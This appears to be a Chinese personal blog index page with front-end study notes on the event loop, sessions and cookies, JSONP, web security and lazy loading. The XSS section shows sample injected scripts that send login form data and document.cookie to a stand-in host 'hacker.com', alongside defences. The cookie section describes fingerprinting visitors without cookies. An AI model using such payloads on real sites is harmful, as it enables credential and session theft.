<!doctype html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Hexo, NexT">





  <link rel="alternate" href="/atom.xml" title="My Little World" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">






<meta property="og:type" content="website">
<meta property="og:title" content="My Little World">
<meta property="og:url" content="http://yoohannah.github.io/page/14/index.html">
<meta property="og:site_name" content="My Little World">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="My Little World">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoohannah.github.io/page/14/">





  <title> My Little World </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">My Little World</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">learn and share</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/js/eventloop.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/js/eventloop.html" itemprop="url">
                  关于事件循环event-loop
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-01T21:47:15+08:00">
                2018-01-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="js单线程"><a href="#js单线程" class="headerlink" title="js单线程"></a>js单线程</h1><p>同一时间只干一件事，干完一件事再干下一件事，<br>如果前一个任务耗时很长，后一个任务也得一直等着</p>
<p>为什么这样设计？<br>js 要指挥浏览器干活，如果有两个线程同时执行任务，一个删除DOM，一个修改该DOM，浏览器会不知道以哪个线程为准</p>
<h1 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h1><p>同步任务，在主线程上排队执行的任务，前一个执行完才能执行后一个任务<br>异步任务，一开始不进入主线程，而进入‘任务队列’被挂起，只有‘任务队列’通知主线程某个异步任务可以执行了，该任务才会进入主线程<br>或者主线程上没有要执行的任务了，就会去任务队列拿任务 ，在确认该到达规定时间后，就给到主线程进行执行其对应的回调函数</p>
<h1 id="event-Loop"><a href="#event-Loop" class="headerlink" title="event Loop"></a>event Loop</h1><p>主线程从”任务队列”中读取事件，这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环）<br>setTimeout(fn,0)的含义是，指定某个任务在主线程最早可得的空闲时间执行，即尽可能早得执行<br>另外如果主线程的栈中当前代码耗时很长，要等很久，按照先主线程，再任务队列的执行顺序，<br>就没办法保证setTimeout的回调函数fn能够在指定的时间执行</p>
<h1 id="node-js-event-loop"><a href="#node-js-event-loop" class="headerlink" title="node.js event loop"></a>node.js event loop</h1><p>nodejs 运行机制：<br> (1）V8引擎解析JavaScript脚本。<br>（2）解析后的代码，调用Node API。<br>（3）libuv库负责Node API的执行。它将不同的任务分配给不同的线程，形成一个Event Loop（事件循环），以异步的方式将任务的执行结果返回给V8引擎。<br>（4）V8引擎再将结果返回给用户。</p>
<p>与任务队列相关方法<br>process.nextTick:在主线程任务全部结束后，读取任务队列的任务之前执行它所指定的函数，<br>如果指定函数里还套嵌process.nextTick方法，或者有多个process.nextTick方法，都要在本轮读取任务队列前执行完<br>setImmediate：它指定的任务总是在下一次的eventloop时执行，<br>如果setImmediate与setTimeout(fn,0)各自添加了一个回调函数，那么在下一loop时，他们回调函数的顺序是不确定<br>如果setImmediate套嵌setImmediate方法,则套嵌的回调函数会被注册到下一轮事件循环中再执行</p>
<p>即多个process.nextTick语句总是在当前”执行栈”一次执行完，多个setImmediate可能则需要多次loop才能执行完。</p>
<p><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="noopener">相关链接</a></p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>task/macrotask:script（整体代码）, setTimeout, setInterval, setImmediate, I/O, UI rendering<br>setTimeout() 设置的异步延迟事件；<br>DOM 操作相关如布局和绘制事件；<br>网络 I/O 如 AJAX 请求事件；<br>用户操作事件，如鼠标点击、键盘敲击。<br>micotask:process.nextTick, Promises（这里指浏览器实现的原生 Promise）, Object.observe, MutationObserver<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">process.nextTick(() =&gt; &#123;</span><br><span class="line">  console.log(&apos;nextTick&apos;)</span><br><span class="line">&#125;)</span><br><span class="line">Promise.resolve()</span><br><span class="line">  .then(() =&gt; &#123;</span><br><span class="line">    console.log(&apos;then&apos;)</span><br><span class="line">  &#125;)</span><br><span class="line">setImmediate(() =&gt; &#123;</span><br><span class="line">  console.log(&apos;setImmediate&apos;)</span><br><span class="line">&#125;)</span><br><span class="line">console.log(&apos;end&apos;)</span><br><span class="line"></span><br><span class="line">//结果</span><br><span class="line">end</span><br><span class="line">nextTick</span><br><span class="line">then</span><br><span class="line">setImmediate</span><br></pre></td></tr></table></figure></p>
<p>micro-task在ES2015规范中称为Job,<br>promise.then的执行其实是向PromiseJobs添加Job</p>
<p>在eventloop中，一个task执行完会检查micotask队列，如果有，则先执行micotask，然后再去异步队列领取任务<br><a href="https://github.com/creeperyang/blog/issues/21" target="_blank" rel="noopener">相关</a><br><a href="https://segmentfault.com/a/1190000010913949" target="_blank" rel="noopener">相关</a><br><a href="https://www.cnblogs.com/dong-xu/p/7000139.html" target="_blank" rel="noopener">相关</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/cache/session&cookie.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/performance/cache/session&cookie.html" itemprop="url">
                  session 和cookie
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-28T08:17:15+08:00">
                2017-12-28
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="正常情况下身份识别"><a href="#正常情况下身份识别" class="headerlink" title="正常情况下身份识别"></a>正常情况下身份识别</h1><p>用户提交登录信息，服务器拿到登录信息进行验证之后，<br>为该用户在session表中建立唯一sessionid,然后在返回响应的时候，将sessionid放在set-cookie中告诉浏览器，将sessionid 放在cookie表中，下次请求的时候放在cookie中再发给我<br>这样用户在已登录的状态下进行的访问请求,浏览器都会在报文中将sessionid放在cookie中给回服务器<br>服务器拿到cookie 就能判断用户是否进行了登录，并根据session表确定登录身份</p>
<h1 id="session-机制"><a href="#session-机制" class="headerlink" title="session 机制"></a>session 机制</h1><p>当用户访问服务器时,服务器就会先检查请求有没有带sessionid,<br>如果没带的话,就为该用户在session列表中建立一个session，<br>(这个session是存储特定用户会话所需的属性及配置信息的一个对象，开发人员可以控制里面是什么内容，可以自定义的)<br>并生成唯一sessionid通过set-cookie给回用户<br>如果有带的话,就根据sessionid 在列表中查找对应的session,将session 取出来使用，如果没找到则可能新建一个</p>
<p>1.浏览器禁用cookie解决办法<br>让浏览器重写url：将sessionid 以参数或者附加信息方式放在url后面传递给服务器<br>表单隐藏字段：服务器在返回表单的时候就将sessionid 以隐藏字段方式给过去,客户端提交表单的时候就一并传回来</p>
<p>2.session什么时候被删除<br>过期就会自动删除<br>执行特定删除命令的时候，比如注销<br>session存在内存中的时候，当服务器被重启或者停止时，session列表会被清空</p>
<p>3.session存储<br>一般存在内存中，但服务器重启或者停止会被清空<br>如果想持久保存，可以放在硬盘里面，这样服务器重启或者停止不会被清空</p>
<h1 id="cookie-机制"><a href="#cookie-机制" class="headerlink" title="cookie 机制"></a>cookie 机制</h1><p>浏览器拿到set-cookie后，会根据sessionid ,域名，路径等相关信息，生成cookie，存到cookie列表中<br>当用户要请求服务器时，就根据请求资源路径去查cookie表，找到的cookie可用的范围如果大于等于请求路径,<br>就将cookie放在请求头给回服务器</p>
<p>1.cookie存储<br>会话cookie存储在内存中，页面关闭就删除<br>设置了过期时间的cookie,会被存储在硬盘上，直到超过设定时间才会被删除</p>
<p>2.cookie与浏览器<br>存储在硬盘上的cookie可以在不同浏览器进程间共享<br>对于内存上的cookie不同浏览器有不同处理方式<br>IE通过 ctrl+N 的方式打开的窗口可以与原窗口共享cookie,但其他方式不行<br>而火狐的所有进程和标签页都可以共享cookie</p>
<p>一般情况下通过js window.open打开的窗口会与原窗口共享内存cookie</p>
<h1 id="游客识别跟踪"><a href="#游客识别跟踪" class="headerlink" title="游客识别跟踪"></a>游客识别跟踪</h1><p>用户未登录情况下进行页面请求，且之后都不进行登录操作的情况下，还要与用户保持可进行身份识别的通信，<br>这种情景解决办法可以有<br>A.<br>一般就需要依靠识别机器来识别用户了<br>首先给未登录用户设置访问用户cookie,<br>根据不同机型用canvas写字像素是不一样的原理<br>这个cookie由游客设备的各种机器特征码组合起来生成给到服务器，<br>服务器存起来<br>下次再访问的时候，就依靠客户端建立的cookie进行识别<br>或者将机器信息传给服务器，由服务器生成再传给浏览器</p>
<p>B.<br>使用fingerprint.js包，它是一个可以根据浏览器的代理字符串，屏幕色深，语言，插件安装与支持的 MIME 类型，时区偏移量和其他功能，如本地存储和会话存储等等，<br>然后这些值通过散列函数传递产生指纹，不需要通过 Cookie 存储就可以识别浏览器</p>
<p>由未登录到登录态要做的事情就要注意两个账号的关联</p>
<p>奇葩问题：在一台设备登录过多个账号的情况下，怎样进行未登录数据的关联<br>首先设备一般会让你先退出再登录另一个账号,<br>即便要登录多个账号,要做关联，在第一个用户登录后就关联完了，后面多个再登录已经不再是由未登录到登录状态了</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/js/jsonp.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/js/jsonp.html" itemprop="url">
                  关于jsonp
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T07:57:15+08:00">
                2017-12-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="关于jsonp"><a href="#关于jsonp" class="headerlink" title="关于jsonp"></a>关于jsonp</h1><p>是一种json数据的使用模式的名称，<br>获取的资料可以是任意js</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>1.在script标签中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.xxxx.com/myService.aspx?param=senddata&amp;jsonp=callbackFunction&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">js:</span><br><span class="line">function callbackFunction(result,methodName)&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p>服务端提供的js脚本会根据param=senddata等查询条件过滤数据，根据jsonp=callbackFunction，动态生成callbackFunction函数，把要传递的数据以参数形式传递进去<br>例，这里服务端js会生成如下语句供回调<br>callbackFunction(data1,dat2),data1,data2即传递的数据<br>2.在ajax中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">dataType:&apos;jsonp&apos;,</span><br><span class="line">data:&apos;id=10&apos;,</span><br><span class="line">jsonp:&apos;jsonp_callback&apos;,</span><br><span class="line">url:&apos;http://www.xxxxx.com/getdata&apos;,</span><br><span class="line">success:function(data)&#123;</span><br><span class="line">//dostuff</span><br><span class="line">&#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>可以直接的success回调函数中使用数据进行处理<br>3.在$.get中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$.get(</span><br><span class="line">&apos;http://xxxxxx.com/services.php?callback=?&apos;,</span><br><span class="line">&#123;</span><br><span class="line">	param: data,  //参数</span><br><span class="line">	function (json) &#123; //dosomething &#125;,  //回调函数，?会替换为这里</span><br><span class="line">  &apos;jsonp&apos;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>4.在$get.json中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(&quot;http://xxxxx.com/services?param1=data1&amp;param1=data2&amp;format=json&amp;jsoncallback=?&quot;,</span><br><span class="line">function(data)&#123; //回调函数</span><br><span class="line">//dosomething</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/safe/XSSCSRF.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/safe/XSSCSRF.html" itemprop="url">
                  XSS 与 CSRF
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T07:56:15+08:00">
                2017-12-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="xss-跨站脚本攻击"><a href="#xss-跨站脚本攻击" class="headerlink" title="xss 跨站脚本攻击"></a>xss 跨站脚本攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过在页面HTML注入js代码，获取页面信息，再将信息传递到攻击者站点</p>
<h2 id="注入js方法"><a href="#注入js方法" class="headerlink" title="注入js方法"></a>注入js方法</h2><p>1.直接将获取信息的代码放在<script></script>标签里面，利用拼接html的过程，将攻击代码注入到HTML<br>2.将攻击代码代码放在攻击者站点里面,利用script标签src属性,将文件引入<br>3.利用页面标签事件属性，攻击代码以触发函数的形式注入，标签事件触发同时触发获取信息的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//例1.原本访问www.original.com/login?id=maya,实现自动将maya赋值到ID输入框里面</span><br><span class="line">&lt;input type=&apos;text&apos; value=&apos;maya&apos;&gt;</span><br><span class="line">//但如果在访问的同时注入攻击代码，如下</span><br><span class="line">www.original.com/login?id=&quot;&gt;&lt;script&gt;var+f=document.getElementById(&apos;login&apos;);+f.action=&apos;http://hacker.com/pwee&apos;;+f.method=&apos;get&apos;;&lt;/script&gt;&quot;</span><br><span class="line">//页面代码就会变成</span><br><span class="line">&lt;input type=&apos;text&apos; value=&apos;&apos;&gt;&lt;script&gt;var f=document.getElementById(&apos;login&apos;); f.action=&apos;http://hacker.com/pwee&apos;; f.method=&apos;get&apos;;&lt;/script&gt;</span><br><span class="line">//登录按钮的id为login，即用户输入id,密码，等登录信息后点击登录按钮时，不仅会向正常的登录网站www.original.com发送登录信息,</span><br><span class="line">//同时会向http://hacker.com站点发送登录信息,攻击者即得到用户的登录信息，如果是支付页面，即可以得到支付密码</span><br><span class="line"></span><br><span class="line">//例2.获取用户登录态cookie的攻击代码xss.js放在攻击者的站点,如下</span><br><span class="line">var content = escape(document.cookie) //escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。</span><br><span class="line">document.write(&quot;&lt;img src=&apos;http://hacker.com/?&apos;&quot;);</span><br><span class="line">document.write(content);</span><br><span class="line">document.write(&apos;&gt;&apos;);</span><br><span class="line">//本次代码注入的方式变为访问</span><br><span class="line">www.original.com/login?id=&quot;&gt;&lt;script src=&apos;http://hacker.com/xss.js&apos;&gt;&lt;/script&gt;&quot;</span><br><span class="line">就会执行xss.js的代码，将用户cookie通过img的src发出的请求送到hacker站点</span><br><span class="line"></span><br><span class="line">//例3. form表单提交时，给提交按钮添加触发事件，触发函数即注入的攻击代码</span><br><span class="line">&lt;input type=&apos;submit&apos; onclick=&apos;hacker()&apos;&gt;</span><br><span class="line">//如果需要用户无察觉的触发，可使用onmousemove、onload等事件进行触发</span><br></pre></td></tr></table></figure></p>
<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>对代码进行漏洞检查；<br>对特殊字符进行encode;<br>对富文本进行白名单处理;<br>在js里面不要用eval,innerHTML；<br>在response头部的set-cookie中添加httponly,不允许脚本操作document.cookie;<br>使用x-xss-protection报头<br>对特殊字符进行encode<br>把 &lt; 替换成 &lt;<br>把 &gt; 替换成 &gt;<br>把 &amp; 替换成 &amp;<br>把 ’ 替换成 &#39;<br>把 ’ 替换成 &quot;<br>代码 div.innerHTML = userComment.replace(/&gt;/g, ‘&lt;’).replace…</p>
<h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>攻击站点通过用户触发攻击代码获取登录态，伪造用户身份向源站请求资源或发送信息</p>
<p><img src="/image/csrf.png" alt="csrf"><br><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener">相关链接</a></p>
<h2 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h2><p>1.利用token,让token以参数角色返回服务器，服务器对比之前保存的token，从而判断该请求来自正常页面请求，攻击站点无法获取到token，因此就不能进行任何操作<br>2.利用攻击站点无法获取cookie的弱点，对获取到的cookie进行转换成token后以参数形式返回后台，因为攻击站点没法获取cookie,也就没办法返回参数<br>3.使用strict-transport-security报头</p>
<h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h1><p>前端提交的数据未经校验处理直接存到数据库，然后从数据库中读取直接插入到页面中<br>1.如果提交的数据本来含有可解析的代码，从数据库读取后在插入过程中可造成XSS攻击<br>2.如果提交的数据含有SQL查询语句，且被直接拼接到SQL语句中被执行，可能会导致执行结果与预期不同的现象</p>
<h2 id="防范-2"><a href="#防范-2" class="headerlink" title="防范"></a>防范</h2><p>对前端提交的数据进行严格校验</p>
<h1 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h1><p>表现就是DNS服务器上解析表被篡改，导致将正常访问的域名指向篡改后的域名</p>
<h1 id="HTTP劫持"><a href="#HTTP劫持" class="headerlink" title="HTTP劫持"></a>HTTP劫持</h1><p>数据包被修改或插入，导致页面出现弹窗广告<br>解决办法就是使用HTTPS<br>使用upgrade-insecure-request报头请求升级HTTPS<br>使用content-security-policy报头响应升级HTTPS</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/lazyload.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/performance/lazyload.html" itemprop="url">
                  懒加载
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T07:55:15+08:00">
                2017-12-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="lazy"><a href="#lazy" class="headerlink" title="lazy"></a>lazy</h1><h2 id="图片lazyload"><a href="#图片lazyload" class="headerlink" title="图片lazyload"></a>图片lazyload</h2><p>基本原理是图片image标签的src属性在构建DOM时，先给一特定的默认值，可以是本地图片路径，然后通过监听scroll事件，<br>判断图片所在位置是否在可视屏幕里面，如果在可视屏幕里面，就将要加载的真正图片资源给到image的src属性<br>当然通过判断src的值是否是默认值，就可以知道图片是否已经被加载过，加载过就不会被从新赋值，然后重新加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function lazyload() &#123;</span><br><span class="line">              const images = document.getElementsByTagName(&apos;img&apos;)</span><br><span class="line">              const len = images.length</span><br><span class="line">              let n = 0</span><br><span class="line">              return function() &#123;</span><br><span class="line">                  console.log(1)</span><br><span class="line">                  const seeHeight = document.documentElement.clientHeight</span><br><span class="line">                  const scrollTop = document.documentElement.scrollTop || document.body.scrollTop</span><br><span class="line">                  for (let i = n; i &lt; len; i++) &#123;</span><br><span class="line">                      if (images[i].offsetTop &lt; seeHeight + scrollTop) &#123; //是否在可视范围</span><br><span class="line">                          if (images[i].getAttribute(&apos;src&apos;) === &apos;默认图片的url&apos;) &#123;</span><br><span class="line">                              images[i].src = images[i].getAttribute(&apos;data-src&apos;) //赋值资源链接</span><br><span class="line">                          &#125;</span><br><span class="line">                          n = n + 1</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          var loadImages = lazyload()</span><br><span class="line">          window.onload = function () &#123;</span><br><span class="line">              loadImages()</span><br><span class="line">              window.addEventListener(&apos;scroll&apos;, loadImages, false)</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure></p>
